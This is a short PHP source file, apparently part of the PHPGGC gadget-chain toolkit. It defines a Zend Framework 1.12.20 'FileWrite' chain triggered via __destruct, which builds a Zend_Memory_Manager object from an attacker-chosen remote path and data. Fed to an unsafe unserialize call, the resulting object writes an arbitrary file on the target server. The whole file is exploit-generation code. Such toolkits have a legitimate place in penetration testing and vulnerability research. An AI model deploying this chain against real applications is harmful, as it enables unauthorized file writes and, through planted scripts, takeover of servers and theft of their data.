<?php

namespace GadgetChain\ZendFramework;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '1.12.20';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \Zend_Memory_Manager($path, $data);
    }
}